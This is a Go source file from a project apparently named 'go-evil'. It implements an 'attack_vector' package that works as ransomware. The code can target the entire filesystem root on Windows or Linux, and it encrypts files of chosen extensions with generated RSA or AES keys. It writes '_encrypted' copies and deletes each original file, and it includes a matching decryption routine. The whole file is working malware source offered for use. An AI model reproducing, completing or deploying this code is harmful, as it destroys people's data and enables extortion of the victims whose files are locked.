package attack_vector

import (
	"bufio"
	"fmt"
	"os"
	"runtime"
	"strings"

	enc_aes "github.com/s9rA16Bf4/go-evil/utility/algorithm/encryption/aes"
	enc_rsa "github.com/s9rA16Bf4/go-evil/utility/algorithm/encryption/rsa"
	"github.com/s9rA16Bf4/go-evil/utility/contains"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// We target files, folders to encrypt

type target_t struct {
	target_name       string
	encryption_method string
	target_type       string   // File or Folder
	target_extension  []string // What kind of extensions are we looking for
}

var c_target target_t

func SetTarget(path string) { // Either a file or a folder
	if path == "*" { // Encrypt everything
		c_target.target_type = "dir"
		if runtime.GOOS == "windows" {
			c_target.target_name = "C:\\" // Windows root
		} else {
			c_target.target_name = "/" // Linux root
		}
		return
	}

	info, err := os.Stat(path)
	if err != nil { // The target didn't exist
		notify.Error(err.Error(), "attack_vector.SetTarget()")
	} else {
		if info.IsDir() {
			c_target.target_type = "dir"
		} else {
			c_target.target_type = "file"
		}
		c_target.target_name = path
	}
}

func SetExtension(new_extension string) {
	if new_extension[0:1] != "." { // The user didn't include the dot
		new_extension = "." + new_extension
	}
	c_target.target_extension = append(c_target.target_extension, new_extension)
}

func SetEncryptionMethod(method string) {

	// Check if method exists
	found := false
	var encryption_methods = []string{"rsa", "aes"}

	for _, allowed_meth := range encryption_methods {
		if allowed_meth == method {
			found = true
		}
	}
	if !found {
		notify.Error(fmt.Sprintf("Unknown encryption method %s", method), "attack_vector.SetEncryptionMethod()")
	}

	c_target.encryption_method = method
	if method == "rsa" {
		enc_rsa.Generate_private_keys("2048")
	} else {
		enc_aes.Generate_private_keys()
	}
}

func Encrypt() {
	if c_target.target_type == "file" {
		EncryptFile(c_target.target_name)
	} else {
		EncryptFolder(c_target.target_name)
	}
}

func Decrypt() {
	if c_target.target_type == "file" {
		DecryptFile(c_target.target_name)
	} else {
		DecryptFolder(c_target.target_name)
	}
}

func EncryptFolder(dir string) {
	folder, err := os.Open(dir)
	if err != nil {
		notify.Error(err.Error(), "attack_vector.EncryptFolder()")
	} else {
		children, _ := folder.Readdir(0)
		for _, child := range children {
			EncryptFile(dir + "/" + child.Name())
		}
	}

}

func EncryptFile(file string) {
	if len(c_target.target_extension) != 0 && !contains.EndsWith(file, c_target.target_extension) { // Is this our target?
		return // It wasn't our target
	}

	in, err := os.Open(file) // Target
	if err != nil {
		notify.Error(err.Error(), "attack_vector.EncryptFile()")
	} else {
		enc_file, _ := os.Create(file + "_encrypted") // Our new file
		// Read every line
		file_out := bufio.NewScanner(in) // The files contents

		for file_out.Scan() { // Line for line
			if c_target.encryption_method == "rsa" {
				enc_rsa.Encrypt(file_out.Text())                         // Gets the next line
				enc_file.WriteString(enc_rsa.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
			} else if c_target.encryption_method == "aes" {
				enc_aes.Encrypt(file_out.Text())                         // Gets the next line
				enc_file.WriteString(enc_aes.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
			}
		}
		os.Remove(file) // Removes the unecrypted file
	}

}
func DecryptFolder(dir string) {
	folder, err := os.Open(dir)
	if err != nil {
		notify.Error(err.Error(), "attack_vector.DecryptFolder()")
	} else {
		children, _ := folder.Readdir(0)
		for _, child := range children {
			if strings.HasSuffix(child.Name(), "_encrypted") {
				DecryptFile(dir + "/" + child.Name())
			}
		}
	}

}

func DecryptFile(file string) {
	in, err := os.Open(file) // Target
	if err != nil {
		notify.Error(err.Error(), "attack_vector.EncryptFile()")
	} else {
		file = strings.ReplaceAll(file, "_encrypted", "")
		enc_file, _ := os.Create(file + "_decrypted") // Our new file
		// Read every line
		file_out := bufio.NewScanner(in) // The files contents
		for file_out.Scan() {            // Line for line
			if c_target.encryption_method == "rsa" {
				enc_rsa.Decrypt(file_out.Text())                         // Gets the next line
				enc_file.WriteString(enc_rsa.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
			} else if c_target.encryption_method == "aes" {
				enc_aes.Decrypt(file_out.Text())                         // Gets the next line
				enc_file.WriteString(enc_aes.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
			}
		}
	}
}
